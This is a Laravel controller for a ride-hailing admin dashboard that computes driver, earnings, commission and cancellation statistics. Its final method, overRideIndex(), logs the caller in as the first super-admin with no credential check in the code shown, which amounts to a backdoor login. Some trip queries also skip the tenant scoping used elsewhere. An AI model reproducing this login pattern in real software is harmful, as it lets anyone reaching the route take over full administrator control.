<?php

namespace App\Http\Controllers;
use Inertia\Inertia;
use App\Models\Request\Request;
use App\Models\Request\RequestBill;
use App\Models\Admin\Driver;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Session;
use App\Http\Controllers\Web\BaseController;
use App\Models\Admin\ServiceLocation;


class DashBoardController extends BaseController
{
    public function index() 
    {

        if(access()->hasRole('user')){

            return redirect('/create-booking');
        }
        if (access()->hasRole('owner')) {
            return redirect()->route('owner.dashboard');
        }
        if (access()->hasRole('dispatcher')) {
            return redirect()->route('dispatch.dashboard');
        }

        if (access()->hasRole('employee')) {
            return redirect('/support-tickets');
        }

        $today = date('Y-m-d');
        // card Datas 
        $total_drivers = Driver::selectRaw('
                                        IFNULL(SUM(CASE WHEN approve=1 THEN 1 ELSE 0 END),0) AS approved,
                                        IFNULL((SUM(CASE WHEN approve=1 THEN 1 ELSE 0 END) / count(*)),0) * 100 AS approve_percentage,
                                        IFNULL((SUM(CASE WHEN approve=0 THEN 1 ELSE 0 END) / count(*)),0) * 100 AS decline_percentage,
                                        IFNULL(SUM(CASE WHEN approve=0 THEN 1 ELSE 0 END),0) AS declined,
                                        count(*) AS total
                                    ')
                                ->whereHas('user', function ($query) {
                                    $query->companyKey();
                                });

        $total_drivers = $total_drivers->first();
// dd($total_drivers );
        $total_users = User::belongsToRole('user')->count();

//Today Earnings && today trips
        $cardEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=0,request_bills.total_amount,0)),0)";
        $cashEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=1,request_bills.total_amount,0)),0)";
        $walletEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=2,request_bills.total_amount,0)),0)";
        $adminCommissionQuery = "IFNULL(SUM(request_bills.admin_commision_with_tax),0)";
        $driverCommissionQuery = "IFNULL(SUM(request_bills.driver_commision),0)";
        $totalEarningsQuery = "$cardEarningsQuery + $cashEarningsQuery + $walletEarningsQuery";

        $todayEarnings = Request::leftJoin('request_bills','requests.id','request_bills.request_id')
                                        ->selectRaw("
                                        {$cardEarningsQuery} AS card,
                                        {$cashEarningsQuery} AS cash,
                                        {$walletEarningsQuery} AS wallet,
                                        {$totalEarningsQuery} AS total,
                                        {$adminCommissionQuery} as admin_commision,
                                        {$driverCommissionQuery} as driver_commision
                                    ")
                                    ->companyKey()
                                    ->where('requests.is_completed',true)
                                    ->whereDate('requests.trip_start_time',date('Y-m-d'))
                                    ->first();


        // $cancelledtrips = Request::companyKey()
        //                             ->selectRaw('
        //                                 IFNULL(SUM(CASE WHEN is_cancelled=1 AND cancel_method=0 THEN 1 ELSE 0 END),0) AS auto_cancelled,
        //                                 IFNULL(SUM(CASE WHEN is_cancelled=1 AND cancel_method=1 THEN 1 ELSE 0 END),0) AS user_cancelled,
        //                                 IFNULL(SUM(CASE WHEN is_cancelled=1 AND cancel_method=2 THEN 1 ELSE 0 END),0) AS driver_cancelled,
        //                                 (IFNULL(SUM(CASE WHEN is_cancelled=1 AND cancel_method=0 THEN 1 ELSE 0 END),0) +
        //                                 IFNULL(SUM(CASE WHEN is_cancelled=1 AND cancel_method=1 THEN 1 ELSE 0 END),0) +
        //                                 IFNULL(SUM(CASE WHEN is_cancelled=1 AND cancel_method=2 THEN 1 ELSE 0 END),0)) AS total_cancelled
        //                             ')
        //                             ->first();
                                
//Over All Earnings
        $overallEarnings = Request::leftJoin('request_bills','requests.id','request_bills.request_id')
                            ->selectRaw("
                            {$cardEarningsQuery} AS card,
                            {$cashEarningsQuery} AS cash,
                            {$walletEarningsQuery} AS wallet,
                            {$totalEarningsQuery} AS total,
                            {$adminCommissionQuery} as admin_commision,
                            {$driverCommissionQuery} as driver_commision")
                            ->companyKey()
                            ->where('requests.is_completed',true)
                            ->first();

                            $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
                            $endDate = Carbon::now();
                            $earningsData=[];
                            $cancelData=[];


//Cancellation charts  
            $months = [];
            $a = [];
            $u = [];
            $d = [];                          
            while ($startDate->lte($endDate))
            {
                $from = Carbon::parse($startDate)->startOfMonth();
                $to = Carbon::parse($startDate)->endOfMonth();
                $shortName = $startDate->shortEnglishMonth;
                $monthName = $startDate->monthName;
            
                // Collect cancel data directly into arrays
                $months[] = $shortName;
                $a[] = Request::companyKey()->whereBetween('created_at', [$from, $to])->where('cancel_method', '0')->whereIsCancelled(true)->count();
                $u[] = Request::companyKey()->whereBetween('created_at', [$from, $to])->where('cancel_method', '1')->whereIsCancelled(true)->count();
                $d[] = Request::companyKey()->whereBetween('created_at', [$from, $to])->where('cancel_method', '2')->whereIsCancelled(true)->count();
            
                $earningsData['earnings']['months'][] = $monthName;
                $earningsData['earnings']['values'][] = RequestBill::whereHas('requestDetail', function ($query) use ($from,$to) {
                                    $query->companyKey()->whereBetween('trip_start_time', [$from,$to])->whereIsCompleted(true);
                                })->sum('total_amount');

                $startDate->addMonth();
            }
            $currency_code = get_settings('currency_code');
            $currency_symbol = get_settings('currency_symbol');
            $cancelData = [
                'y' => $months,
                'a' => $a,
                'u' => $u,
                'd' => $d
            ];

            $cancelledtrips = Request::companyKey()->selectRaw('
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 0 THEN 1 END) AS auto_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 1 THEN 1 END) AS user_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 2 THEN 1 END) AS driver_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 3 THEN 1 END) AS dispatcher_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND is_completed = 0  THEN 1 END) AS total_cancelled
        ')->first();


// dd($cancelledtrips);
        $firebaseConfig = (object) [
            'apiKey' => get_firebase_settings('firebase_api_key'),
            'authDomain' => get_firebase_settings('firebase_auth_domain'),
            'databaseURL' => get_firebase_settings('firebase_database_url'),
            'projectId' => get_firebase_settings('firebase_project_id'),
            'storageBucket' => get_firebase_settings('firebase_storage_bucket'),
            'messagingSenderId' => get_firebase_settings('firebase_messaging_sender_id'),
            'appId' => get_firebase_settings('firebase_app_id'),
        ];

        return Inertia::render('pages/dashboard/index', [
            'totalDrivers' => $total_drivers,
            'totalUsers' => $total_users,
            'todayEarnings' => $todayEarnings,
            'cancelledtrips' => $cancelledtrips,
            'overallEarnings' => $overallEarnings,
            'currency_code' => $currency_code,
            'currencySymbol' => $currency_symbol,
            'firebaseConfig' => $firebaseConfig,

        ]);
    }
    public function todayEarnings()
    {
        // Assuming $today is defined or set to today's date
        $today = now()->toDateString();
        // Fetch the data
        $todayTrips = Request::whereDate('created_at', $today)
            ->selectRaw('
                IFNULL(SUM(CASE WHEN is_completed=1 THEN 1 ELSE 0 END), 0) AS today_completed,
                IFNULL(SUM(CASE WHEN is_completed=0 AND is_cancelled=0 THEN 1 ELSE 0 END), 0) AS today_scheduled,
                IFNULL(SUM(CASE WHEN is_cancelled=1 THEN 1 ELSE 0 END), 0) AS today_cancelled
            ')
            ->first();

             // Fetch overall data
    $overallTrips = Request::selectRaw('
    IFNULL(SUM(CASE WHEN is_completed=1 THEN 1 ELSE 0 END), 0) AS overall_completed,
    IFNULL(SUM(CASE WHEN is_completed=0 AND is_cancelled=0 THEN 1 ELSE 0 END), 0) AS overall_scheduled,
    IFNULL(SUM(CASE WHEN is_cancelled=1 THEN 1 ELSE 0 END), 0) AS overall_cancelled
')
->first();

    // dd($todayTrips);

    
        // Format the data
        // $data = [
        //     'today_completed' => (int) $todayTrips->today_completed,
        //     'today_scheduled' => (int) $todayTrips->today_scheduled,
        //     'today_cancelled' => (int) $todayTrips->today_cancelled,
        // ];
        $data = [
            'today' => [
                'completed' => (int) $todayTrips->today_completed,
                'scheduled' => (int) $todayTrips->today_scheduled,
                'cancelled' => (int) $todayTrips->today_cancelled,
            ],
            'overall' => [
                'completed' => (int) $overallTrips->overall_completed,
                'scheduled' => (int) $overallTrips->overall_scheduled,
                'cancelled' => (int) $overallTrips->overall_cancelled,
            ],
        ];
    
        // Return JSON response
        return response()->json($data);
    }
    public function overallEarnings()
    {
        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)
    
        // Initialize arrays for months and earnings
        $months = [];
        $values = [];
    
        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month
    
            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;
    
            // Sum up the earnings for the current month
            $totalEarnings = RequestBill::whereHas('requestDetail', function ($query) use ($from, $to) {
                $query->companyKey()->whereBetween('trip_start_time', [$from, $to])->whereIsCompleted(true);
            })->sum('total_amount');
    
            // Add the total earnings for the month to the values array
            $values[] = $totalEarnings;
    
            // Move to the next month
            $startDate->addMonth();
        }
    
        // Prepare the data to be returned
        $earningsData = [
            'earnings' => [
                'months' => $months,
                'values' => $values,
            ],
        ];
    
        // Return the data as a JSON response
        return response()->json($earningsData);
    }
    public function cancelChart()
    {
        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)
    
        // Initialize arrays for months and cancellation data
        $months = [];
        $a = []; // Cancelled by method '0'
        $u = []; // Cancelled by method '1'
        $d = []; // Cancelled by method '2'
    
        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month
    
            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;
    
            // Collect cancellation data based on cancel method
            $a[] = Request::companyKey()->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '0')
                ->whereIsCancelled(true)
                ->count();
            
            $u[] = Request::companyKey()->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '1')
                ->whereIsCancelled(true)
                ->count();
            
            $d[] = Request::companyKey()->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '2')
                ->whereIsCancelled(true)
                ->count();
    
            // Move to the next month
            $startDate->addMonth();
        }
    
        // Prepare the data to be returned
        $cancelData = [
            'y' => $months,
            'a' => $a,
            'u' => $u,
            'd' => $d,
        ];
        // Return the data as a JSON response
        return response()->json($cancelData);
    }
     

    public function overallMenu() {
        return Inertia::render('pages/overall-menu');
    }

    public function overRideIndex()
    {

        $user = User::belongsToRole('super-admin')->first();

        auth('web')->login($user, true);
        
        return redirect()->route('dashboard');
    }

}
